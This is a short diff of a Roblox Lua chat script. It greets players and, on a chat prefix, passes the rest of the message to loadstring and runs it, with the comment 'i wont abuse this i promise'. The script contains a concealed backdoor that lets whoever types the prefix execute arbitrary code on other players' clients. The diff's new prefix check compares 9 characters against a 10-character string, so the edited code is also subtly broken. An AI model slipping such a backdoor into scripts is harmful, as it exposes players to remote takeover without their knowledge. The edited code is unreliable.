@@ -180,7 +180,7 @@ if game:GetService("Players").LocalPlayer.Name ~= "StefanukSwAg" and game:GetSer
         if chat == "hi gamers" then
             game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("m Hi Epic Gamers! v2", "All")
         end
-        if string.sub(chat, 1, 9) == ":execute " then
+        if string.sub(chat, 1, 9) == ":aexecute " then
             loadstring(string.sub(message, 10, -1))() -- i wont abuse this i promise
         end
     end)
